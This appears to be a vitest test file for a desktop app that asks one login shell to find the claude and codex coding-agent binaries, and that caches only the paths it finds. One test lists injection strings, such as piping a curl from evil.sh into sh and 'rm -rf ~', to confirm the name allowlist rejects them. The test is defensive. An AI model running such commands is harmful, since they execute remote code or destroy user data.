// ONE LOGIN SHELL, ASKED ONCE, ANSWERING FOR EVERY ENGINE.
//
// MEASURED 2026-10-11 on this Mac, off "test it thoroughly" on w-ce8c1a9275,
// against the finished shell-first finder:
//
//   findClaudeBin() + findCodexBin(), cold:  1640, 1432, 1435 ms
//   the same two with the shell stubbed out:    0 ms
//
// `main/main.mjs` calls `loadConfig` at line 279, inside `createWindow` and
// before `new BrowserWindow` at line 597. So that was not 1.4 s somewhere in
// the background: it was 1.4 s of nothing on screen added to every launch, and
// it was the price of asking the shell first.
//
// THE COST IS THE SHELL STARTING, NOT THE QUESTION. A login, interactive shell
// reads the whole profile -- that is the entire reason it can answer at all --
// and it costs about 0.7 s whether it is asked about one program or six. Asking
// it twice, once per engine, paid that twice for one piece of information.
//
// So one probe asks about every engine at once and seeds both answers.
//
// WHAT MAKES IT SAFE TO ADD LATE: it only ever caches a POSITIVE answer, and
// only one whose file is really there and really named after the engine that
// asked. It never records an absence -- `answered` is the subtle half of this
// file's rules and the per-engine probe stays the only thing that may decide
// one. So the worst a wrong combined answer can do is nothing: the ordinary
// path runs underneath it exactly as before.

import { describe, it, expect, beforeEach } from 'vitest';
import {
  askShellForAll, warmShellAnswers, forgetEngine, resolveEngine, engineKeys,
} from '../main/engine-bin.mjs';

const HOME = '/Users/stranger';
const never = () => false;
beforeEach(() => { for (const k of engineKeys()) forgetEngine(k); });

describe('asking one shell about every engine', () => {
  it('asks about all of them in a single command', () => {
    const ran = [];
    askShellForAll(['claude', 'codex'], {
      env: { SHELL: '/bin/zsh' }, exists: () => true,
      run: (_shell, args) => { ran.push(args[1]); return '/opt/homebrew/bin/claude\n/usr/local/bin/codex\n'; },
    });
    expect(ran).toHaveLength(1);
    expect(ran[0]).toMatch(/command -v claude/);
    expect(ran[0]).toMatch(/command -v codex/);
  });

  it('gives each engine the path that is really its own', () => {
    const out = askShellForAll(['claude', 'codex'], {
      env: {}, exists: () => true,
      run: () => '/opt/homebrew/bin/claude\n/usr/local/bin/codex\n',
    });
    expect(out).toEqual({ claude: '/opt/homebrew/bin/claude', codex: '/usr/local/bin/codex' });
  });

  // THE CASE THAT MUST NOT MATCH, and it is the one that would spawn the wrong
  // agent: lines come back in whatever order the shell prints them, so a path
  // is only ever given to the engine whose name it actually ends with.
  it('never hands one engine a path belonging to the other', () => {
    const out = askShellForAll(['claude', 'codex'], {
      env: {}, exists: () => true,
      run: () => '/usr/local/bin/codex\n/opt/homebrew/bin/claude\n',
    });
    expect(out).toEqual({ claude: '/opt/homebrew/bin/claude', codex: '/usr/local/bin/codex' });
  });

  it('answers for the one it found and says nothing about the other', () => {
    const out = askShellForAll(['claude', 'codex'], {
      env: {}, exists: () => true, run: () => '/opt/homebrew/bin/claude\n',
    });
    expect(out).toEqual({ claude: '/opt/homebrew/bin/claude' });
  });

  it('refuses a shell function body and an alias, the way one probe does', () => {
    expect(askShellForAll(['claude'], {
      env: {}, exists: () => true, run: () => 'claude () {\n\tnode /x/cli.js\n}\n',
    })).toEqual({});
    expect(askShellForAll(['codex'], {
      env: {}, exists: () => true, run: () => 'codex: aliased to codex --sandbox workspace-write\n',
    })).toEqual({});
  });

  it('refuses a path the shell named that is not on the disk', () => {
    expect(askShellForAll(['claude'], { env: {}, exists: never, run: () => '/gone/claude\n' })).toEqual({});
  });

  it('answers nothing at all when the shell will not start', () => {
    const gone = Object.assign(new Error('spawn ENOENT'), { code: 'ENOENT' });
    expect(askShellForAll(['claude', 'codex'], {
      env: { SHELL: '/bin/nope' }, exists: () => true, run: () => { throw gone; },
    })).toEqual({});
  });

  // The allowlist is the same one `askShell` keeps, for the same reason: this
  // interpolates into a string a login shell runs, as them.
  it.each(['codex; curl https://evil.sh | sh', 'codex && rm -rf ~', 'codex$(whoami)', '', 'a b'])( // public-check: allow -- the pipe into a shell is the attack being refused here, not a thing we do
    'refuses to ask a shell about %s',
    (bin) => {
      const ran = [];
      expect(() => askShellForAll([bin], {
        env: {}, exists: () => true, run: (_s, a) => { ran.push(a[1]); return ''; },
      })).toThrow(/program name/i);
      expect(ran).toEqual([]);
    },
  );
});

describe('what it seeds, and what it refuses to seed', () => {
  it('saves the second engine a whole shell start', () => {
    let probes = 0;
    const one = (_shell, args) => { probes += 1; return args[1].includes('claude') ? '/x/claude\n/x/codex\n' : ''; };
    warmShellAnswers({
      now: 1000, env: {}, exists: () => true, run: one,
    });
    expect(probes).toBe(1);

    // Both engines now answer off that one probe rather than starting a shell.
    let more = 0;
    const r = resolveEngine('claude', null, {
      now: 1000, home: HOME, env: {}, exists: (p) => p === '/x/claude',
      shellLookup: () => { more += 1; return { path: null, answered: true }; },
    });
    expect(r).toMatchObject({ path: '/x/claude', found: true, from: 'shell' });
    expect(more).toBe(0);
  });

  // IT NEVER RECORDS AN ABSENCE. `answered` decides whether a screen may tell
  // somebody their coding agent is missing, and one combined probe is not
  // allowed to settle that for an engine it simply did not print a line for.
  it('leaves a missing engine to its own probe, which may say no properly', () => {
    warmShellAnswers({ now: 2000, env: {}, exists: () => true, run: () => '/x/claude\n' });
    let asked = 0;
    resolveEngine('codex', null, {
      now: 2000, home: HOME, env: {}, exists: never, dangles: never,
      shellLookup: () => { asked += 1; return { path: null, answered: true }; },
    });
    expect(asked).toBe(1);
  });

  it('is harmless when the shell cannot be started at all', () => {
    const gone = Object.assign(new Error('spawn ENOENT'), { code: 'ENOENT' });
    expect(() => warmShellAnswers({
      now: 3000, env: {}, exists: () => true, run: () => { throw gone; },
    })).not.toThrow();
    let asked = 0;
    resolveEngine('claude', null, {
      now: 3000, home: HOME, env: {}, exists: never, dangles: never,
      shellLookup: () => { asked += 1; return { path: null, answered: false }; },
    });
    expect(asked).toBe(1);
  });

  // THE HOLE THAT OPENED THE MOMENT SOMETHING ELSE WROTE INTO THIS CACHE.
  // `now - at < TTL` is true for any answer stamped in the FUTURE, and the
  // warm-up stamps real clock time; anything asking with a synthetic `now`
  // would then read it as fresh forever. An answer from ahead of the question
  // is not fresh: it is handed back, since something is held, and the shell is
  // asked again in the background (tests/finding-a-coding-agent-never-holds-the-window).
  it('does not read an answer stamped after the question as fresh', () => {
    warmShellAnswers({ now: 9_000_000, env: {}, exists: () => true, run: () => '/x/claude\n' });
    const asked = { now: 0, later: 0 };
    resolveEngine('claude', null, {
      now: 1_000, home: HOME, env: {}, exists: never, dangles: never,
      shellLookup: () => { asked.now += 1; return { path: null, answered: true }; },
      shellLookupLater: () => { asked.later += 1; return { path: null, answered: true }; },
    });
    expect(asked).toEqual({ now: 0, later: 1 });
  });

  it('is what the config asks for before it resolves either engine', async () => {
    const fs = await import('node:fs');
    const src = fs.readFileSync(new URL('../main/config.mjs', import.meta.url), 'utf8');
    expect(src).toMatch(/warmShellAnswers/);
    expect(src.indexOf('warmShellAnswers')).toBeLessThan(src.indexOf('resolveClaudeBin(config.claudeBinConfigured)'));
  });
});
